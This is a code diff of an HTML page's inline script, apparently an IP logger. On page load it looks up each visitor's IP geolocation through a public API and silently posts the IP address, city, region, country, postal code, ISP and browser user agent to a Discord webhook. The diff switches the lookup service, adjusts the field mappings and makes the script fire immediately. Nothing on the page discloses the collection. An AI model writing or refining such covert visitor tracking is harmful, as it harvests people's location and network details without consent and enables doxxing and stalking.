@@ -42,12 +42,11 @@
   </div>
 
   <script>
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553533799948755070/1qNcnLdY-FtfIVl_qygR7qJWysfV7lwHTI8mnAi1f_k76OhmOvtXOZXwYLE_phql4tDD";
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553533799948755070/1qNcnLdY-FtfIVl_qygR7qJWysfV7IwHTI8mnAi1f_k76OhmOvtX0ZXwYLE_phql4tDD";
 
     async function sendVisitorDetails() {
       try {
-        const response = await fetch("https://ipapi.co/json/");
-        if (!response.ok) throw new Error("Network lookup failed");
+        const response = await fetch("https://ipwho.is/");
         const data = await response.json();
 
         const payload = {
@@ -60,10 +59,10 @@
                 { name: "IP Address", value: data.ip || "Unknown", inline: true },
                 { name: "City", value: data.city || "Unknown", inline: true },
                 { name: "Region / State", value: data.region || "Unknown", inline: true },
-                { name: "Country", value: `${data.country_name || "Unknown"} (${data.country_code || ""})`, inline: true },
+                { name: "Country", value: `${data.country || "Unknown"} (${data.country_code || ""})`, inline: true },
                 { name: "Postal Code", value: data.postal || "Unknown", inline: true },
-                { name: "ISP / Network", value: data.org || "Unknown", inline: false },
-                { name: "Device / Browser", value: navigator.userAgent.slice(0, 100) + "...", inline: false }
+                { name: "ISP / Network", value: (data.connection && data.connection.isp) || "Unknown", inline: false },
+                { name: "Device / Browser", value: navigator.userAgent.slice(0, 120), inline: false }
               ],
               footer: { text: "Visit Log" },
               timestamp: new Date().toISOString()
@@ -81,7 +80,7 @@
       }
     }
 
-    window.addEventListener("DOMContentLoaded", sendVisitorDetails);
+    sendVisitorDetails();
   </script>
 </body>
 </html>
